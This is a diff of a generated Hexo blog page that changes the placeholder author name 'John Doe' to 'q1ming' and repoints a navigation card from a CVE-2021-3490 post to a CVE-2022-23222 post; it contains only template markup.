@@ -527,7 +527,7 @@ cd linux-5.11gi">
                     All articles in this blog are used except for special statements
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     reprint policy. If reproduced, please indicate source
-                    <a href="/about" target="_blank">John Doe</a>
+                    <a href="/about" target="_blank">q1ming</a>
                     !
                 </span>
             </div>
@@ -644,13 +644,13 @@ cd linux-5.11gi">
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2025/01/14/cve-2021-3490/">
+                <a href="/2025/01/14/cve-2022-23222/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="CVE-2021-3490">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="CVE-2022-23222">
                         
-                        <span class="card-title">CVE-2021-3490</span>
+                        <span class="card-title">CVE-2022-23222</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -666,7 +666,7 @@ cd linux-5.11gi">
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            John Doe
+                            q1ming
                             
                         </span>
                     </div>
@@ -719,7 +719,7 @@ cd linux-5.11gi">
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            John Doe
+                            q1ming
                             
                         </span>
                     </div>
@@ -927,7 +927,7 @@ cd linux-5.11gi">
             
                 <span id="year">2019-2025</span>
             
-            <a href="/about" target="_blank">John Doe</a>
+            <a href="/about" target="_blank">q1ming</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             
